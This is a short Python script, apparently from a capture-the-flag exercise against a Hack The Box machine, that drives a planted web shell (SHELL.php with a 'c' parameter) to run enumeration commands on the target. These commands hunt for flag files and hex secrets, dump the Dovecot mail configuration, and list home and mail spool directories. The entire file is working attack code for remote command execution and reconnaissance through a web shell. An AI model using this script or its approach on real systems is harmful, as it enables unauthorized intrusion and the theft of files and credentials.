import urllib.request, urllib.parse

cmds = [
    # Search for any 32-char hex strings accessible to www-data
    "find / -type f -readable 2>/dev/null | xargs grep -l -E '^[a-f0-9]{32}$' 2>/dev/null | head -20",
    # Check for flag pattern in various locations
    'find /var/www -type f -name "*.txt" -o -name "*.flag" 2>/dev/null',
    'find /opt -type f -readable 2>/dev/null | head -30',
    'find /etc -name "*.flag" -o -name "flag*" 2>/dev/null',
    # Check the Dovecot config more carefully
    "cat /etc/dovecot/dovecot.conf 2>&1 | grep -v '^#' | grep -v '^$' | head -50",
    # Look for executable scripts or binaries that might be reachable
    "find / -type f -executable -readable 2>/dev/null | head -20",
    "ls -la /home/",
    # Check haris's crontab or any user mail filter
    "ls -la /var/spool/mail/ 2>&1",
]

for cmd in cmds:
    url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": cmd})
    headers = {"Host": "support_001.enigma.htb"}
    req = urllib.request.Request(url, headers=headers)
    try:
        resp = urllib.request.urlopen(req, timeout=30)
        result = resp.read().decode("utf-8", errors="replace").strip()
        if result and "Permission denied" not in result:
            print(f"=== {cmd[:60]} ===")
            print(result[:2000])
            print()
    except Exception as e:
        pass
